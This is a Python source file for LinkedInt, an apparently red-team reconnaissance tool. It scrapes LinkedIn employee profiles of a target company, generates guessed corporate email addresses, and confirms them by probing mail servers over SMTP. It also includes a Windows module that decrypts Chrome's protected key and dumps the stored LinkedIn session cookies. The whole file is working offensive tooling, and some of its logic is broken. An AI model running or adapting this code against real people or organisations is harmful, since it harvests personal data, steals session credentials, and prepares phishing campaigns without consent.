# LinkedInt
# Scrapes LinkedIn without using LinkedIn API
# Original scraper by @DisK0nn3cT (https://github.com/DisK0nn3cT/linkedin-gatherer)
# Modified by @vysecurity
# - Additions:
# --- UI Updates
# --- Constrain to company filters
# --- Addition of Hunter for e-mail prediction


#!/usr/bin/env python3

from code import interact
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
import socket
import sys
import re
import os
import json
import requests
import json
import argparse
import smtplib
import dns.resolver
import urllib3

PROXY_SETTING = {} #{"http": "http://localhost:8081", "https": "http://localhost:8081"}

SSL_VERIFY = False

PREFIX_CHOICES = ["auto", "full", "firstlast", "firstmlast", "flast", "first", "first.last", "fmlast", "lastfirst"]

class CookieDumper():
    cookie_path = ''
    local_state  = ''
    def __init__(self):
        if os.name != 'nt':
            print ('Only Windows OS is supported at this time')
            sys.exit(1)
        self.cookie_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google\\Chrome\\User Data\\Default\\Network\\Cookies')
        if not os.path.exists(self.cookie_path):
            print ('Could not find Cookie file. Please ensure you have Chrome installed and have logged in to LinkedIn')
            sys.exit(1)
        self.local_state = os.path.join(os.getenv('LOCALAPPDATA'), 'Google\\Chrome\\User Data\\Local State')
        if not os.path.exists(self.local_state):
            print ('Could not find Local State file. Please ensure you have Chrome installed and have logged in to LinkedIn')
            sys.exit(1)

    @staticmethod
    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    @staticmethod
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def decrypt_value(self, key, data):
        try:
            iv = data[3:15]
            payload = data[15:]
            cipher = self.generate_cipher(key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return ""

    def grab_cookies(self):
        # First we need to decrypt the Local State key
        with open(self.local_state, 'r') as f:
            js = json.load(f)
        import base64
        state_key = base64.b64decode(js['os_crypt']['encrypted_key'])[5:]

        # use ctypes to decrypt DPAPI protected state key
        from ctypes import windll, Structure, POINTER, c_char, byref, c_buffer, cdll
        from ctypes.wintypes import DWORD
        CryptUnprotectData = windll.crypt32.CryptUnprotectData
        LocalFree = windll.kernel32.LocalFree
        memcpy = cdll.msvcrt.memcpy

        class DATA_BLOB(Structure):
            _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]

        blobOut = DATA_BLOB()
        bufferIn = c_buffer(state_key, len(state_key))
        blobIn = DATA_BLOB(len(state_key), bufferIn)
        CryptUnprotectData(byref(blobIn), None, None, None, None, 0, byref(blobOut))
        cbData = int(blobOut.cbData)
        pbData = blobOut.pbData
        buffer = c_buffer(cbData)
        memcpy(buffer, pbData, cbData)
        LocalFree(pbData);
        key = buffer.raw

        # now grab the cookies from the db
        import sqlite3, shutil, datetime, uuid
        class FakeObj():
            def close():
                pass
        cursor = FakeObj()
        conn = FakeObj()
        cookies = {}
        try:
            temp_name = os.path.join(os.getenv('TEMP'), str(uuid.uuid4()))
            shutil.copy(self.cookie_path, temp_name)
            conn = sqlite3.connect(temp_name)
            cursor = conn.cursor()
            now = int(datetime.datetime.now().timestamp() + 11644473600 * 1000000)
            cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%.linkedin.com' AND expires_utc > ?", [now])
            for result in cursor.fetchall():
                name = result[0]
                encrypted_value = result[1]
                decrypted = self.decrypt_value(key, encrypted_value)
                cookies[name] = decrypted
        except Exception as e:
            print (f'Error dumping LinkedIn cookies: {e}')
        finally:
            cursor.close()
            conn.close()
            if os.path.exists(temp_name):
                os.remove(temp_name)
        return cookies


class Scraper():
    interactive = False
    username = ''
    password = ''
    prefix = ''
    suffix = ''
    outfile = ''
    validate = False
    by_company = False
    company_id = None
    session = requests.Session()
    session.proxies = PROXY_SETTING
    session.verify = SSL_VERIFY
    user_agent ='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'

    def __init__(self, username, password, prefix, suffix, outfile, by_company, 
        company_id=None, validate=False, user_agent='', interactive=False):
        self.username = username
        self.password = password
        self.prefix = prefix
        self.suffix= suffix
        self.outfile = os.path.splitext(outfile)[0]
        self.by_company = by_company
        self.company_id = company_id
        self.validate = validate
        self.interactive = interactive
        if user_agent:
            self.user_agent = user_agent
        self.session.headers.update({'User-Agent': self.user_agent})

    def authenticate(self):
        r = self.session.get("https://www.linkedin.com/uas/login")
        parse = BeautifulSoup(r.text, "html.parser")
        csrf = parse.find("input", {"name": "loginCsrfParam"})['value']

        login_data = {'session_key': self.username, 'session_password': self.password, 'loginCsrfParam': csrf}
        r = self.session.post("https://www.linkedin.com/uas/login-submit", 
            data=login_data)
        parse = BeautifulSoup(r.text, "html.parser")

        if 'Security Verification' in r.text:

            if 'captchaV2Challenge' in r.text:
                print ("[!] Captcha detected. Try logging in using Chrome and then use the 'cookies' module (Windows only) to dump your cookies.")
                print ("[!] The cookie file can then be provided to this script using the --cookies option.")
                sys.exit(1)
            else:
                print ("[!] Login checkpoint hit. Check your email for a code (requires --interactive), or log in from the same IP and try again.")
                print ("[!] Alternatively, log in using Chrome and then use the 'cookies' module (Windows only) to dump your cookies.")
                print ("[!] The cookie file can then be provided to this script using the --cookies option.")
            if not self.interactive:
                sys.exit(1)

            pin = input("[*] Check email and enter code here: ")
            url = 'https://www.linkedin.com/checkpoint/challenge/verify'
            data = {}
            data['csrfToken'] = parse.find("input", {"name": "csrfToken"})['value']
            data['pageInstance'] = parse.find("input", {"name": "pageInstance"})['value']
            data['resendUrl'] = parse.find("input", {"name": "resendUrl"})['value']
            data['challengeId'] = parse.find("input", {"name": "challengeId"})['value']
            data['language'] = parse.find("input", {"name": "language"})['value']
            data['displayTime'] = parse.find("input", {"name": "displayTime"})['value']
            data['challengeSource'] = parse.find("input", {"name": "challengeSource"})['value']
            data['requestSubmissionId'] = parse.find("input", {"name": "requestSubmissionId"})['value']
            data['challengeType'] = parse.find("input", {"name": "challengeType"})['value']
            data['challengeData'] = parse.find("input", {"name": "challengeData"})['value']
            data['challengeDetails'] = parse.find("input", {"name": "challengeDetails"})['value']
            data['failureRedirectUri'] = parse.find("input", {"name": "failureRedirectUri"})['value']
            data['flowTreeId'] = parse.find("input", {"name": "flowTreeId"})['value']
            data['signInLink'] = parse.find("input", {"name": "signInLink"})['value']
            data['joinNowLink'] = parse.find("input", {"name": "joinNowLink"})['value']
            data['_s'] = parse.find("input", {"name": "_s"})['value']
            data['pin'] = int(pin)
            r = self.session.post(url, data=data)

        return self.test_auth()

    def load_cookies(self, cookie_file):
        with open(cookie_file) as f:
            self.session.cookies.update(json.load(f))
        return self.test_auth()

    def test_auth(self):
        # preflight request in case the user doesn't have a JSESSIONID yet
        self.session.get('https://www.linkedin.com/feed/')
        try:
            self.session.headers.update({'Csrf-Token': self.session.cookies.get_dict()["JSESSIONID"].strip('"')})
            self.session.headers.update({'X-RestLi-Protocol-Version': '2.0.0'})
        except:
            return False
        
        # Now we can test against the API
        r = self.session.get('https://www.linkedin.com/voyager/api/me', allow_redirects=False)
        success = r.status_code == 200
        if success:
            print ('[+] Auth success')
        else:
            print ('[!] Auth failed')
        return success

    def get_search(self, search):
        body = ""
        csv = []
        css = """<style>
        #employees {
            font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
            border-collapse: collapse;
            width: 100%;
        }

        #employees td, #employees th {
            border: 1px solid #ddd;
            padding: 8px;
        }

        #employees tr:nth-child(even){background-color: #f2f2f2;}

        #employees tr:hover {background-color: #ddd;}

        #employees th {
            padding-top: 12px;
            padding-bottom: 12px;
            text-align: left;
            background-color: #4CAF50;
            color: white;
        }
        </style>

        """

        header = """<center><table id=\"employees\">
                 <tr>
                 <th>Photo</th>
                 <th>Name</th>
                 <th>Possible Email:</th>
                 <th>Job</th>
                 <th>LinkedIn ID</th>
                 </tr>
                 """

        # Do we want to automatically get the company ID?
        if self.by_company and not self.company_id:
            # Automatic
            # Grab from the URL 
            companyID = 0
            url = "https://www.linkedin.com/voyager/api/typeahead/hits"
            params = {'q': 'blended', 'query': search}
            r = self.session.get(url, params=params)
            content = r.json()
            firstID = 0

            for i in range(0, len(content['elements'])):
                try:
                    companyID = content['elements'][i]['hitInfo']['com.linkedin.voyager.typeahead.TypeaheadCompany']['id']
                    if firstID == 0:
                        firstID = companyID
                    print ("[Notice] Found company ID: %s" % companyID)
                except:
                    continue
            companyID = firstID
            print ("[*] Using company ID: %s" % companyID)
            if companyID == 0:
                print ("[WARNING] No valid company ID found in auto, please restart and find your own")
        elif self.by_company:
            # Don't auto, use the specified ID
            companyID = self.company_id
            print ("[*] Using company ID: %s" % companyID)

        # Fetch the initial page to get results/page counts
        url = "https://www.linkedin.com/voyager/api/search/cluster"
        if self.by_company:
            params = {'count': 40, 'guides': f'List(v->PEOPLE,facetCurrentCompany->{companyID})', 
                'origin': 'OTHER', 'q': 'guided', 'start': 1}
        else:
            params = {'count': 40, 'guides': 'List()', 'keywords': search, 'origin': 'OTHER', 'q': 'guided', 'start': 1}

        r = self.session.get(url, params=params)
        content = r.json()
        data_total = content['elements'][0]['total']

        # Calculate pages off final results at 40 results/page
        pages = data_total / 40

        if pages == 0:
            pages = 1

        if data_total % 40 == 0:
           # Because we count 0... Subtract a page if there are no left over results on the last page
            pages = pages - 1

        if pages == 0: 
            print ("[!] Try to use quotes in the search name")
            sys.exit(0)
    
        print ("[*] %i Results Found" % data_total)
        if data_total > 1000:
            pages = 25
            print ("[*] LinkedIn only allows 1000 results. Refine keywords to capture all data")
        print ("[*] Fetching %i Pages" % pages)

        for p in range(1, pages):
            # Request results for each page using the start offset
            if self.by_company:
                params = {'count': 40, 'guides': f'List(v->PEOPLE,facetCurrentCompany->{companyID})', 
                    'origin': 'OTHER', 'q': 'guided', 'start': p*40}
            else:
                params = {'count': 40, 'guides': 'List()', 'keywords': search, 'origin': 'OTHER', 'q': 'guided', 'start': p*40 }

            r = self.session.get(url, params=params)
            content = r.json()
            print ("[*] Fetching page %i with %i results" % ((p), len(content['elements'][0]['elements'])))
            for c in content['elements'][0]['elements']:
                if 'com.linkedin.voyager.search.SearchProfile' in c['hitInfo'] and c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['headless'] == False:
                    try:
                        data_industry = c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['industry']
                    except:
                        data_industry = ""

                    data_firstname = c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['miniProfile']['firstName']
                    data_lastname = c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['miniProfile']['lastName']
                    data_slug = "https://www.linkedin.com/in/%s" % c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['miniProfile']['publicIdentifier']
                    data_occupation = c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['miniProfile']['occupation']
                    data_id = c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['backendUrn'].split(":")[3]

                    try:
                        data_picture = "https://media.licdn.com/mpr/mpr/shrinknp_400_400%s" % c['hitInfo']['com.linkedin.voyager.search.SearchProfile']['miniProfile']['picture']['com.linkedin.voyager.common.MediaProcessorImage']['id']
                    except:
                        print ("[*] No picture found for %s %s, %s" % (data_firstname, data_lastname, data_occupation))
                        data_picture = ""

                    # incase the last name is multi part, we will split it down
                    parts = data_lastname.split()
                    name = data_firstname + " " + data_lastname
                    fname = ""
                    mname = ""
                    lname = ""

                    if len(parts) == 1:
                        fname = data_firstname
                        mname = '?'
                        lname = parts[0]
                    elif len(parts) == 2:
                        fname = data_firstname
                        mname = parts[0]
                        lname = parts[1]
                    elif len(parts) >= 3:
                        fname = data_firstname
                        lname = parts[0]
                    else:
                        fname = data_firstname
                        lname = '?'

                    fname = re.sub('[^A-Za-z]+', '', fname)
                    mname = re.sub('[^A-Za-z]+', '', mname)
                    lname = re.sub('[^A-Za-z]+', '', lname)

                    if len(fname) == 0 or len(lname) == 0:
                        # invalid user, let's move on, this person has a weird name
                        continue

                    #come here

                    if self.prefix == 'full':
                        user = '{}{}{}'.format(fname, mname, lname)
                    if self.prefix == 'firstlast':
                        user = '{}{}'.format(fname, lname)
                    if self.prefix == 'firstmlast':
                        user = '{}{}{}'.format(fname, mname[0], lname)
                    if self.prefix == 'flast':
                        user = '{}{}'.format(fname[0], lname)
                    if self.prefix == 'first.last':
                        user = '{}.{}'.format(fname, lname)
                    if self.prefix == 'fmlast':
                        user = '{}{}{}'.format(fname[0], mname[0], lname)
                    if self.prefix == 'lastfirst':
                        user = '{}{}'.format(lname, fname)

                    email = '{}@{}'.format(user, self.suffix)

                    body += "<tr>" \
                        "<td><a href=\"%s\"><img src=\"%s\" width=200 height=200></a></td>" \
                        "<td><a href=\"%s\">%s</a></td>" \
                        "<td>%s</td>" \
                        "<td>%s</td>" \
                        "<td>%s</td>" \
                        "<a>" % (data_slug, data_picture, data_slug, name, email, data_occupation, data_id)

                    if self.validate and validate_email(self.suffix, email):
                        csv.append(b'"%s","%s","%s","%s","%s", "%s"' % (data_firstname, data_lastname, name, email, data_occupation, data_id))

                    foot = "</table></center>"
                    with open('{}.html'.format(self.outfile), 'wb') as f:
                        f.write(css.encode())
                        f.write(header.encode())
                        f.write(body.encode())
                        f.write(foot.encode())

                    with open('{}.csv'.format(self.outfile), 'wb') as f:
                        f.writelines('\n'.join(csv))
                else:
                    print ("[!] Headless profile found. Skipping")

        def validate_email(self, domain,email):
            """
            Functionality and Code was adapted from the SimplyEmail Project: https://github.com/SimplySecurity/SimplyEmail
            """
            #Setting Variables
            mxhost = ""
            FinalList = []
            hostname = socket.gethostname()
    
            #Getting MX Record
            MXRecord = []
            try:
                print (' [*] Attempting to resolve MX records!')
                answers = dns.resolver.query(domain, 'MX')
                for rdata in answers:
                    data = {
                        "Host": str(rdata.exchange),
                        "Pref": int(rdata.preference),
                    }
                    MXRecord.append(data)
                # Now find the lowest value in the pref
                Newlist = sorted(MXRecord, key=lambda k: k['Pref'])
                # Set the MX record
                mxhost = Newlist[0]
                val = ' [*] MX Host: ' + str(mxhost['Host'])
                print (val)
            except Exception as e:
                error = ' [!] Failed to get MX record: ' + str(e)
                print (error)

            #Checking Email Address
            socket.setdefaulttimeout(10)
            server = smtplib.SMTP(timeout=10)
            server.set_debuglevel(0)
            try:
                print (" [*] Checking for valid email: " + str(email))
                server.connect(mxhost['Host'])
                server.helo(hostname)
                server.mail('email@gmail.com')
                code, message = server.rcpt(str(email))
                server.quit()
            except Exception as e:
                print (e)
    
            if code == 250:
                #print ("Valid Email Address Found: %s" % email
                return True
            else:
                #print ("Email not valid %s" % email
                return False


def lookup_prefix(api_key, suffix):
    #if auto prefix then we want to use hunter IO to find it.
    url = "https://api.hunter.io/v2/domain-search?domain=%s&api_key=%s" % (suffix, api_key)
    r = requests.get(url, proxies=PROXY_SETTING, verify=SSL_VERIFY)
    content = r.json()

    if "status" in content:
        print ("[!] Rate limited by Hunter IO Key")
        return False

    prefix = content['data']['pattern']
    print ("[!] %s" % prefix)
    if prefix:
        prefix = prefix.replace("{","").replace("}", "")
        if prefix in PREFIX_CHOICES:
           print ("[+] Found %s prefix" % prefix)
           return prefix
    return False

def banner():
    with open('banner.txt', 'rb') as f:
        data = f.read()

    print ("\033[1;31m%s\033[0;0m" % data.decode())
    print ("\033[1;34mProviding you with Linkedin Intelligence")
    print ("\033[1;32mAuthor: Vincent Yiu (@vysec, @vysecurity)\033[0;0m")
    print ("\033[1;32mOriginal version by @DisK0nn3cT\033[0;0m")


if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser(description='Discovery LinkedIn')
    parsers = parser.add_subparsers(dest='subparser_name', title='module')
    parsers.required = True
    
    scrape_parser = parsers.add_parser("scrape", help="Scrape LinkedIn for a target company or keyword")
    scrape_parser.add_argument('-u', '--username', help='Username')
    scrape_parser.add_argument('-p', '--password', help='Password')
    scrape_parser.add_argument('-c', '--cookies', help='Cookie file to use (dump with cookies module)')
    scrape_parser.add_argument('-a', '--api-key', help='Hunter API Key', required=False)
    scrape_parser.add_argument('-s', '--search', help='Search Keywords (use quotes for more percise results)', required=True)
    scrape_parser.add_argument('-b', '--by-company', help='Filter by Company', action=argparse.BooleanOptionalAction)
    scrape_parser.add_argument('-v', '--validate', help='Validate e-mails', action=argparse.BooleanOptionalAction)
    scrape_parser.add_argument('-i', '--company-id', help='Company ID', required=False)
    scrape_parser.add_argument('--suffix', help='Suffix for e-mail generation (e.g. example.com)', required=True)
    scrape_parser.add_argument('--prefix', help='Prefix for e-mail generation', default='auto', choices=PREFIX_CHOICES)
    scrape_parser.add_argument('-o', '--output', help='Output file (do not include extentions)', required=True)
    scrape_parser.add_argument('--user-agent', help='Custom User-Agent', default='')
    scrape_parser.add_argument('--interactive', help='Interactive prompt', action=argparse.BooleanOptionalAction)

    cookie_parser = parsers.add_parser("cookies", help="Extracts LinkedIn Cookies from Chrome for use with this script.")
    cookie_parser.add_argument('-o', '--output', help='Output file (do not include extentions)', required=True)

    args = parser.parse_args()

    # Disable HTTPS warnings from requests >= 2.16.0 library
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if args.subparser_name == 'scrape':

        if args.prefix == "auto":
            if not args.api_key:
                print ("[!] No API key given. Please provide with the --api-key parameter.")
                sys.exit(1)
            prefix = lookup_prefix(args.api_key, args.suffix)
            if not prefix:
                print ("[!] Automatic prefix search failed, please insert a manual choice")
                sys.exit(1)
        else:
            prefix = args.prefix

        if args.cookies and (args.username or args.password):
            print ('[!] Specify either a username/password combo OR a cookie file')
            sys.exit(1)
        elif not args.username and not args.password and not args.cookies:
            print ('[!] Please provide both username and password')
            sys.exit(1)

        scraper = Scraper(args.username, args.password, prefix, args.suffix, args.output, 
            args.by_company, args.company_id, args.validate, args.user_agent, args.interactive)

        # Skip auth if required
        if args.cookies:
            if os.path.exists(args.cookies):
                print (f'[*] Loading cookie file: {args.cookies}')
                if not scraper.load_cookies(args.cookies):
                    print ('[!] Cookies are invalid. Login using Chrome and dump again.')
                    sys.exit(1)
            else:
                print ('[!] Cookie file not found')
                sys.exit(1)
        elif not scraper.authenticate():
            print ('Failed password authentication')
            sys.exit(1)
    
        scraper.get_search(args.search)
        print ("[+] Complete")

    elif args.subparser_name == 'cookies':
        dumper = CookieDumper()
        cookies = dumper.grab_cookies()
        if not cookies:
            print ("Cookie dumping failed")
            sys.exit(1)

        outfile = os.path.splitext(args.output)[0] + '.json'
        with open(outfile, 'w') as f:
            json.dump(cookies, f)
        print (f"[+] Cookie dump success. Saved to {outfile}")

    else:
        parser.print_help()
